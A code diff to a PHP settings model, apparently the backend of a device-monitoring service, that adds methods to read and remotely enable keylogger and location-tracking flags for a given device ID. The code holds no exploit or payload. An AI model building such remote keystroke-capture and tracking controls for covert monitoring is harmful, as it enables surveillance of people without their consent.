@@ -209,11 +209,29 @@ class Settings extends BaseModel
         return $this->getDb()->query("SELECT * FROM `dev_settings` WHERE `dev_id` = {$escapedDevId} LIMIT 1")->fetch();
     }
 
+    public function getKeyloggerEnabled($devId)
+    {
+        $escapedDevId = $this->getDB()->quote($devId);
+        return $this->getDb()->query("SELECT `keylogger_enabled` FROM `dev_settings` WHERE `dev_id` = {$escapedDevId} LIMIT 1")->fetch();
+    }
+    
+    public function getLocationServiceEnabled($devId)
+    {
+        $escapedDevId = $this->getDB()->quote($devId);
+        return $this->getDb()->query("SELECT `location_service_enabled` FROM `dev_settings` WHERE `dev_id` = {$escapedDevId} LIMIT 1")->fetch();
+    }
+    
     public function activateKeylogger($devId)
     {
         $escapedDevId = $this->getDB()->quote($devId);
 
         $this->getDb()->exec("UPDATE `dev_settings` SET `keylogger_activate` = 1 WHERE `dev_id` = {$escapedDevId} LIMIT 1");
+    }
+    
+    public function activateLocation($devId)
+    {
+        $escapedDevId = $this->getDB()->quote($devId);
+        $this->getDb()->exec("UPDATE `dev_settings` SET `location_service_enabled` = 1 WHERE `dev_id` = {$escapedDevId} LIMIT 1");
     }
 
     public function getSettings($devId)
